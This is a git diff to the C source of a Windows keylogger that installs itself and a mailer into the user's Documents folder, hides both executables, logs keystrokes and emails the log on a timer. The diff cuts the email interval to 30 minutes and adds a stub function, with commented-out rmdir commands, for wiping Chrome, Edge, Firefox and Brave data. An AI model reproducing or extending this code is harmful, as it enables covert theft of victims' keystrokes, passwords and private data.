@@ -7,10 +7,11 @@
 
 // GLOBALS //
 #define BUF_SIZE 256   // general purpose for buffers
-#define LOG_TIMER 3600 // time limit until send email (3600s == 1 hour)
+#define LOG_TIMER 1800 // time limit until send email (3600s == 1 hour)
 
 // FUNCTION DECLARATIONS //
 void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory);
+void ClearBrowserCache();
 char* GetTime();
 void HideWindow();
 void InitLogfile(char* logfile_path);
@@ -102,16 +103,16 @@ void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory){
 
     // build new file paths
     char keylogger_new_path[MAX_PATH];
-    sprintf(keylogger_new_path, "C:\\Users\\%s\\Music\\keylogger.exe", username);
+    sprintf(keylogger_new_path, "C:\\Users\\%s\\Documents\\keylogger.exe", username);
     
     char mailer_new_path[MAX_PATH];
-    sprintf(mailer_new_path, "C:\\Users\\%s\\Music\\mailer.exe", username);
+    sprintf(mailer_new_path, "C:\\Users\\%s\\Documents\\mailer.exe", username);
     
     char logfile_new_path[MAX_PATH];
-    sprintf(logfile_new_path, "C:\\Users\\%s\\Music\\log.txt", username);
+    sprintf(logfile_new_path, "C:\\Users\\%s\\Documents\\log.txt", username);
     
     char new_directory[MAX_PATH];
-    sprintf(new_directory, "C:\\Users\\%s\\Music\\", username);
+    sprintf(new_directory, "C:\\Users\\%s\\Documents\\", username);
 
     // attempt to execute in case of failure to install files in desired spot
     // move keylogger
@@ -141,6 +142,19 @@ void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory){
     // hide the executables
     SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
     SetFileAttributes(mailer_path, FILE_ATTRIBUTE_HIDDEN);
+}
+
+void ClearBrowserCache(){
+    char browser_path[MAX_PATH];
+    sprintf(browser_path, "C:\\Users\\%s\\", getenv("USERNAME"));
+
+    //char remove_command[] = "rmdir /Q /S ";
+    //char create_command[] = "mkdir ";
+
+    // clear chrome
+    // clear microsoft edge
+    // clear firefox
+    // clear brave
 }
 
 // get current time
@@ -235,7 +249,7 @@ void ExecuteMailer(char* mailer_path, char* directory){
     // wait for child process to complete to prevent emailing emptied logfile
     WaitForSingleObject(&pi.hProcess, INFINITE);
     CloseHandle(&pi);
-    Sleep(1000);
+    Sleep(2000);
 }
 // writes to file the interpretation of keystroke
 void KeystrokeHandler(short key, FILE* logfile){
